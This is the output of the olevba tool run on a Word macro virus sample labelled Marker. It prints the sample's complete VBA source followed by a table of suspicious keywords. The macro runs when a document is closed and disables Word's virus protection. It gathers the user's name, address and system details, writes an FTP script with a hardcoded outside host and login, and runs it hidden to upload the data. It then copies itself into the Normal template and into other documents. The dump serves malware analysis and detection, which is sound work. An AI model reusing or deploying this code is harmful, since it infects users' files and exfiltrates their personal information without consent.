olevba 0.60.1.dev6 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Marker.ee-86579a0655f234e3920b127d27e400a0825ac71d
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Marker.ee-86579a0655f234e3920b127d27e400a0825ac71d - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Close()
On Error Resume Next
' Surveyor, Developed by:
' An MCA Student
' School Of Technology And Applied Sciences
' Mahatham Gandhi University Regional Center
' Edappally, Kochi 24
' 16th March 2000
Const Signature = "School Of Technology And Applied Sciences"
Dim SaveDocument, SaveNormalTemplate, DocumentInfected, NormalTemplateInfected As Boolean
Dim ActiveDoc, NormalTemplt As Object
Dim UserAddress, ReportFile, ReportData, MyCode, Message As String

Message = "Today is Independence day." & Chr(13) & Chr(13) & "Vandhay Matharam!"
Set ActiveDoc = ActiveDocument.VBProject.VBComponents.Item(1)
Set NormalTemplt = NormalTemplate.VBProject.VBComponents.Item(1)
Options.VirusProtection = False
DocumentInfected = ActiveDoc.CodeModule.Find(Signature, 1, 1, 9999, 9999)
NormalTemplateInfected = NormalTemplt.CodeModule.Find(Signature, 1, 1, 9999, 9999)
If (Day(Now()) = 15) And (Month(Now()) = 8) Then
    MsgBox Message, vbInformation + vbOKOnly, "Independence Day"
End If
If (System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info", "Uploaded") = False) Then
    With Application
    ReportData = "Name: " & .UserName & Chr(13) & vbLf _
    & "Address: " & .UserAddress & Chr(13) & vbLf _
    & "Date & Time: " & Format(Date, "dddd, d mmm yyyy ") _
    & Format(Time, "hh:mm:ss AMPM ") & Chr(13) & vbLf _
    & "Processor Type:" & System.ProcessorType & Chr(13) & vbLf _
    & "Free Disk Space: " & System.FreeDiskSpace
    End With
    For i = 1 To 4
         ReportFile = ReportFile + Mid(Str(Int(90001 * Rnd + 9999)), 2, 1)
    Next i
    ReportFile = "C:\su" & ReportFile & ".sys"
    Open ReportFile For Output As #1
    Print #1, ReportData
    Close #1
    
    Open "c:\netacc.vxd" For Output As #1
    Print #1, "o home.fiberia.com"
    Print #1, "user surveyor"
    Print #1, "fAERTf"
    Print #1, "cd survey"
    Print #1, "ascii"
    Print #1, "put " & ReportFile
    Print #1, "quit"
    Close #1
    
    Shell "command.com /c ftp.exe -n -s:c:\netacc.vxd", vbHide
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info", "Uploaded") = True
End If

If (DocumentInfected = True Xor NormalTemplateInfected = True) And _
    (ActiveDocument.SaveFormat = wdFormatDocument Or _
    ActiveDocument.SaveFormat = wdFormatTemplate) Then
   
   If DocumentInfected = True Then
      SaveNormalTemplate = NormalTemplate.Saved
      MyCode = ActiveDoc.CodeModule.Lines(1, ActiveDoc.CodeModule.CountOfLines)
      
      NormalTemplt.CodeModule.DeleteLines 1, NormalTemplt.CodeModule.CountOfLines
      NormalTemplt.CodeModule.AddFromString MyCode
    End If
    If SaveNormalTemplate = True Then
        NormalTemplate.Save
    End If
    

    If NormalTemplateInfected = True And _
         (Mid(ActiveDocument.FullName, 2, 1) = ":" Or _
        ActiveDocument.Saved = False) Then
  
        SaveDocument = ActiveDocument.Saved
    
        MyCode = NormalTemplt.CodeModule.Lines(1, NormalTemplt.CodeModule.CountOfLines)

        ActiveDoc.CodeModule.DeleteLines 1, ActiveDoc.CodeModule.CountOfLines
        ActiveDoc.CodeModule.AddFromString MyCode
    
    If SaveDocument = True Then
        ActiveDocument.Save
    End If
   End If
  
End If
  
End Sub








+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|put                 |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|command             |May run PowerShell commands                  |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |ftp.exe             |Executable file name                         |
+----------+--------------------+---------------------------------------------+

